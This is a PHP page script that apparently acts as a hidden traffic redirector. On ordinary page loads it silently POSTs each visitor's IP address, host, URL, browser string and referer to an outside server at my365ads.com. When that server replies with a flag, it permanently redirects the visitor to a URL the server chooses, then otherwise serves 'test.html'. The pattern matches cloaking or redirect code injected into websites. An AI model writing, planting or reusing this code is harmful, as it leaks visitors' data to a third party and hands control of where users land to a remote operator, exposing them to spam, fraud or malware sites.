<?php


  function get_client_ip()
{
    $IP = '';
    if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $IP = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {$IP = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $IP = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $IP = $_SERVER['REMOTE_ADDR'];
    }
    return $IP ? $IP : "unknow";
}
function zclog($content,$dir,$filename)
{
    if (!is_dir($dir)) {
        $flag = mkdir($dir, 0777, true);
    }
    file_put_contents($dir.$filename, $content, FILE_APPEND);
}
function getMsecTime()
{

    list($msec, $sec) = explode(' ', microtime());
    $msectime =  (float)sprintf('%.0f', (floatval($msec) + floatval($sec)) * 1000);
    return $msectime;
}

function getMsecToMescdate()
{
    $msectime = getMsecTime() * 0.001;
    if(strstr($msectime,'.')){
        sprintf("%01.3f",$msectime);
        list($usec, $sec) = explode(".",$msectime);
        $sec = str_pad($sec,3,"0",STR_PAD_RIGHT);
    }else{
        $usec = $msectime;
        $sec = "000";
    }

    $date = date("Y-m-d H:i:s.x",$usec+4*3600);
    return $mescdate = str_replace('x', $sec, $date);
}


function myFilter(){
    $headers = apache_request_headers();

    $ip = get_client_ip();

    $host = $headers['Host'];

    $info = explode(".",$host);
    if ($info[0] == 'www'){
        $host = str_replace('www.','',$host);
    }

    $url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    $browser = $headers['User-Agent'];
    $referer = $headers['Referer'];
    $md5 = strtoupper(md5($ip.'BC5E3ED3-DE70-44b1-B55C-ED31FC5FF368'));
    $arr = array('ip'=>$ip,'host'=>$host,'url'=>$url,'browser'=>$browser,'referer'=>$referer,'md5'=>$md5);

    $urlhz = substr(strrchr($url, "."), 1);

    if ( $urlhz== 'css' || $urlhz== 'js' ||$urlhz== 'img' || $urlhz== 'png' ||$urlhz== 'svg' || $urlhz== 'jpg' ||
        $urlhz=='gif' || $_SERVER['REQUEST_URI'] == '/index.php?main_page=page_not_found'){

        return;
    }else{

        if (($_GET['t'] && $_GET['u']) || strpos($urlhz,'php')!== false || strpos($urlhz,'php?')!== false || $urlhz== 'html' 
            || substr($_SERVER['REQUEST_URI'],0,2) == '/?' || $_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php' || $_SERVER['REQUEST_URI'] == '/index.html' || ($_SERVER['REQUEST_URI'] != '' && substr($_SERVER['REQUEST_URI'], -1) == '/') ) {

            $url2 = "http://gg.my365ads.com/ip/check.do";
            //zclog( getMsecToMescdate().'  首页访问IP:'.$ip.PHP_EOL,'/www/web/log/',str_replace(".","_",$host).'.txt');
            $post_data = array("op" => urlencode(stripslashes(json_encode($arr))));
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url2);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            $output = curl_exec($ch);
            curl_close($ch);
                    
            if(!$output)
            {
                $url3 = "https://web.my365ads.com/ip/check.do";
                $ch1 = curl_init();
                curl_setopt($ch1, CURLOPT_URL, $url3);
                curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch1, CURLOPT_POST, 1);
                curl_setopt($ch1, CURLOPT_POSTFIELDS, $post_data);
                $output = curl_exec($ch1);
                curl_close($ch1);
            }

            $output = json_decode(json_encode(json_decode($output)), True);

            if ($output['turnStyle'] == 1) {
                //zclog( getMsecToMescdate().'  成功跳转IP:'.$ip.PHP_EOL,'/www/web/log/',str_replace(".","_",$host).'.txt');

                header("HTTP/1.1 301 Moved Permanently");
                header("Location:" . $output['url']);
                exit;
            }else{
                //zclog( getMsecToMescdate().'  不跳转IP:'.$ip.PHP_EOL,'/www/web/log/',str_replace(".","_",$host).'.txt');

            }
        }
    }
}

myFilter();

include 'test.html';